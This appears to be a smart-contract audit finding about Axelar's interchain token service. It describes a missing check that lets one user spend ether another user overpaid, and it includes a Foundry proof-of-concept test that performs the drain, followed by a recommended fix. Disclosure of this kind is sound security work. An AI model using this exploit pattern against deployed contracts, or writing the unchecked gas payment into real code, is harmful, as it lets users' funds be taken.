# Vulnerability details

## Impact
`gasValue` is not checked to be  equal or lesser than msg.value sent in during cross chain messaging/execution. This causes two things 
- user A can overpay with no direct way to refund the excess payment back to user A
- User B can spend user A's left over ether on its own remote token deployment/execution requests. user A's excess eth is lost forever. 

## Proof of Concept
For example when deploying an Interchain token remotely, users are required to specify the gas amount they wish to use for gas costs payment on the remote chain. This gas cost amount is sent in the same transaction as the `deployInterchainToken()` is payable function. 

In `deployInterchainToken()`, there is no check for if the `gasValue` amount specified by the user is equal to the ether value sent in the same function by the user, this gives a chance for users to specify a bigger  `gasValue` than the ether they send in.

The call in `gatewayCaller.callContract()` sends the eth amount for gas to the protocol and then proceeds to forward an interchain message to deploy the token on the remote chain. `gatewayCaller.callContract()` snippet below
https://github.com/code-423n4/2024-08-axelar-network/blob/4572617124bed39add9025317d2c326acfef29f1/interchain-token-service/contracts/utils/GatewayCaller.sol#L35-L69
```solidity
    function callContract(
        string calldata destinationChain,
        string calldata destinationAddress,
        bytes calldata payload,
        MetadataVersion metadataVersion,
        uint256 gasValue
    ) external payable override {
        if (gasValue > 0) {
            if (metadataVersion == MetadataVersion.CONTRACT_CALL) {
                // slither-disable-next-line arbitrary-send-eth
                gasService.payNativeGasForContractCall{ value: gasValue }(
                    address(this),
                    destinationChain,
                    destinationAddress,
                    payload,
                    // solhint-disable-next-line avoid-tx-origin
                    tx.origin //@audit using tx.orgin as refund address is bad, especially if tx.orgin is a contract/smart wallet with a complex fallback, this will cause the tx to always run out of gas
                );
            } else if (metadataVersion == MetadataVersion.EXPRESS_CALL) {
                // slither-disable-next-line arbitrary-send-eth
                gasService.payNativeGasForExpressCall{ value: gasValue }(
                    address(this),
                    destinationChain,
                    destinationAddress,
                    payload,
                    // solhint-disable-next-line avoid-tx-origin
                    tx.origin
                );
            } else {
                revert InvalidMetadataVersion(uint32(metadataVersion));
            }
        }

        gateway.callContract(destinationChain, destinationAddress, payload);
    }
```

because  the `gasService.payNativeGasForContractCall{ value: gasValue }()` uses `gasValue` amount specified by user and not the `msg.value` amount it is possible for a user to send in 0 eth for example and specify 0.05 eth or more as `gasValue` cost for the interchain execution. And if the interchainTokenService contract currently holds that amount of eth in its balance, this 0.05 eth amount will be paid for the user and used to execute the user's cross chain call. 

`Gateway.callContract()` actually has a comment which says "`msg.value` must be at least gasValue." as seen [here](https://github.com/code-423n4/2024-08-axelar-network/blob/4572617124bed39add9025317d2c326acfef29f1/interchain-token-service/contracts/utils/GatewayCaller.sol#L33-L34) but this is not actually implemented in the function logic. 

So this vuln exploit can work if:

- user A specifies `gasValue` amount and sends in more eth than `gasValue`, i.e msg.value > gasValue for an interchain execution
- this causes the excess eth to remain on the interchainTokenService contract and user A isnt refunded the excess (only gasValue amount (and not msg.value) goes to the gasService which processes refunds). 
- user B sees this excess eth in the contract and uses by it by calling `deployInterchainToken()` to deploy interchain token on a remote chain with 0 eth gas value and specifying a `gasValue` sufficient for remote chain execution. This allows user B to use the eth on the `InterchainTokenService` contract to pay for its remote chain execution request, thus executing on a remote chain for free.

contract InterChainTokenTest is Test {
    skinnedInterChainTokenService its;
    address interchainTokenFactory = makeAddr('interchainTokenFactory');

    function setUp() public {
        //deploy gasService
        address gasService = payable(address(new GasService()));
        //deploy gateway
        address gateway = payable(address(new Gateway()));

        //deploy gatewayCaller
        address gatewayCaller = payable(address(new GatewayCaller(gateway, gasService)));

        its = new skinnedInterChainTokenService(gatewayCaller, interchainTokenFactory);
    }

    function testSendInterchainRequestForFree() public {
        //user A mistakenly pays more eth than required
        address userA = makeAddr('user a');
        vm.deal(userA, 1 ether);
        uint gasValue = 0.05 ether; //eth value for execution of remote interchain deployment
        uint excessAmountSentInByUser = 0.5 ether;
        vm.prank(userA);
        //in the call below more eth is sent than specified by user in gasValue
        its.deployInterchainToken{ value: excessAmountSentInByUser }(
            bytes32(uint(100)),
            'DstChain',
            'InterChain USDC',
            'itsUSDC',
            18,
            abi.encode('0x1234567'),
            gasValue
        );

        //now the its has a balance of 0.45 ether
        assertEq(excessAmountSentInByUser - gasValue, payable(address(its)).balance);

        //this 0.45 ether is then in the contract, user B notices this and tries to use this lost ether to pay for its own executions
        //thus zeroing any hope that user A can perhaps reclaim its excess eth back.
        uint itsBalBefore = payable(address(its)).balance;
        address userB = makeAddr('user B');
        vm.prank(userB);

        //user B makes the call and executes a remote token deployment with a 0 eth/ msg.value amount in the call.
        its.deployInterchainToken{ value: 0 ether }(
            bytes32(uint(100)),
            'DstChain',
            'InterChain USDC',
            'itsUSDC',
            18,
            abi.encode('0x1234567'),
            gasValue
        );
        uint itsBalAfter = payable(address(its)).balance;
        //now we assert that the interchainTokenService balance of 0.45 eth has been reduced to < 0.45 eth  by the call user B made
        assertLt(itsBalAfter, itsBalBefore);
        //so this means user B is deploying remote tokens for free! and user A has lost 0.45 eth forever
        //all because there is no strict check to enforce that gasValue >= msg.value.
    }

## Recommended Mitigation Steps
add `require(msg.value == gasValue)` to `gateWayCaller.callContract()` function logic or to the logic of the deploy/interchainTransfer functions. This will ensure that users always send in the gasValue amount they specify in each call they make.
